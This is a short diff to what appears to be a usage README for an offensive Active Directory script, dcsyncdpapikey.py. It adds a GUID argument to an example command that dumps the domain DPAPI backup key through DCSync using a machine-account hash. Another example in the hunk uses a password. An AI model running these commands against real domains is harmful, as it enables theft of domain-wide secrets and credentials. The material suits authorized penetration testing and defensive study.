@@ -17,7 +17,7 @@ python3 dcsyncdpapikey.py domain/user:'pw'@target -ldap-only
 
 # dump key via DCSync with extracted GUID
 
-python3 dcsyncdpapikey.py domain/DC\$@target -hashes :hash -key-only --guid
+python3 dcsyncdpapikey.py domain/DC\$@target -hashes :hash -key-only --guid GUID
 
 ```
 
